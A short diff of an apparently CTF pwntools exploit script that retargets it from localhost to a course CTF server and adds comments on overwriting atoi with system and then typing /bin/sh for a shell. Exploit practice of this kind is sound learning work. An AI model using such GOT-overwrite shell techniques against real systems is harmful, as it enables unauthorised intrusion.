@@ -2,8 +2,8 @@ from pwn import *
 from time import sleep
 context.arch = 'amd64'
 
-#r = remote('csie.ctf.tw',10137)
-r = remote('localhost',8888)
+r = remote('csie.ctf.tw',10138)
+#r = remote('localhost',8888)
 
 #r.interactive()
 size = '64'
@@ -87,4 +87,7 @@ change(0,0x123, p64(sys_addr) )
 #show()
 
 
+#use atoi with user input /bin/sh
+#can not send '/bin/sh' during the script, because the pipeline will catch the father input
+#remember to type /bin/sh
 r.interactive()
